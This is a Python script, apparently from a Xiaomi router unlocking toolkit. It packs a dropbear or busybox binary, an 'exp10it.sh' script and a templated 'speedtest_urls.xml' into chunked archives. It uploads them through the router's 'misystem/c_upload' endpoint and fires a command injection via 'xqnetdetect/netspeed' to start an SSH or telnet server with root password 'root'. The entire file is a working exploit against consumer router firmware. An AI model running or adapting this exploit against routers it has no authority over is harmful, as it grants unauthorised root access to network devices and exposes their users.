#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import re
import time
import random
import hashlib
import requests
import socket
import tarfile
import gzip

import xmir_base
from gateway import *


gw = create_gateway(ssh_port = 122, die_if_sshOk = True, die_if_ftpOk = False)

dn = gw.device_name

use_ssh = True

dn_tmp = 'tmp/'

if use_ssh:
    dn_dir = 'data/payload_ssh/'
else:
    dn_dir = 'data/payload/'

print("Begin creating a payload for the exploit...")

if use_ssh:
    fn_pfname = 'dropbearmulti'
else:
    fn_pfname = 'busybox'

fn_pf = f'{dn_tmp}/{fn_pfname}' + '_{num}'
fn_payload = f'{dn_tmp}/payload' + '_{num}.tar.gz'

fn_suffix = '_mips'
if dn == 'R3D' or dn == 'D01':
    fn_suffix = '_armv7a'
if dn == "RB03":
    fn_suffix = '_arm64'

fn_pf_orig = dn_dir + fn_pfname + fn_suffix

for num in range(0, 9):
    fn = fn_payload.format(num = num)
    os.remove(fn) if os.path.exists(fn) else None
    fn = fn_pf.format(num = num)
    os.remove(fn) if os.path.exists(fn) else None

with open(fn_pf_orig, "rb") as file:
    pf = file.read()
    pf = gzip.compress(pf, compresslevel = 9)

max_payload_size = 100*1024
max_chunk_size = 90*1024

FN_pf = [ ]
FN_payload = [ ]
for num in range(0, 9):
    pos = num * max_chunk_size
    chunk = pf[pos:pos+max_chunk_size]
    if not chunk:
        break
    fn = fn_pf.format(num = num)
    with open(fn, "wb") as file:
        file.write(chunk)
    FN_pf.append(fn)
    FN_payload.append(fn_payload.format(num = num))

if len(FN_pf) < 1:
    raise RuntimeError('len(FN_pf) < 1')

fn_exploit = "exp10it.sh"
command = f"sh /tmp/{fn_exploit}"

fn_executor = "speedtest_urls.xml"
with open(dn_dir + fn_executor, "rt", encoding = "UTF-8") as file:
    template = file.read()

data = template.format(router_ip_address=gw.ip_addr, command=command)
with open(dn_tmp + fn_executor, "wt", encoding = "UTF-8", newline = "\n") as file:
    file.write(data)

for num, fn_pf in enumerate(FN_pf):
    with tarfile.open(FN_payload[num], "w:gz", compresslevel=9) as tar:
        tar.add(fn_pf, arcname = os.path.basename(fn_pf))
        if num == len(FN_pf) - 1:
            tar.add(dn_tmp + fn_executor, arcname = fn_executor)
            tar.add(dn_dir + fn_exploit, arcname = fn_exploit)
            if use_ssh:
                tar.add(dn_dir + 'dropbear.uci.cfg', arcname = 'dropbear.uci.cfg')
                tar.add(dn_dir + 'dropbear.init.d.sh', arcname = 'dropbear.init.d.sh')

for num, fn_pf in enumerate(FN_pf):
    os.remove(fn_pf) if os.path.exists(fn_pf) else None
    tgz_size = os.path.getsize(FN_payload[num])
    if tgz_size > max_payload_size - 128:
        die(f'File size "{FN_payload[num]}" exceeds 100KiB')

print("Start uploading the exploit with payload...")

for num, fn_payload in enumerate(FN_payload):
    requests.post(gw.apiurl + "misystem/c_upload", files={"image":open(fn_payload, 'rb')})

time.sleep(1)

if use_ssh:
    print(f"Running SSH server on port {gw.ssh_port}...")
    gw.use_ssh = True
else:
    print("Running TELNET and FTP servers...")
    gw.use_ftp = True

requests.get(gw.apiurl + "xqnetdetect/netspeed")

time.sleep(0.5)
gw.passw = 'root'
gw.ping(contimeout = 27)

print("")
print(f"#### Connection to device {gw.device_name} is OK ####")
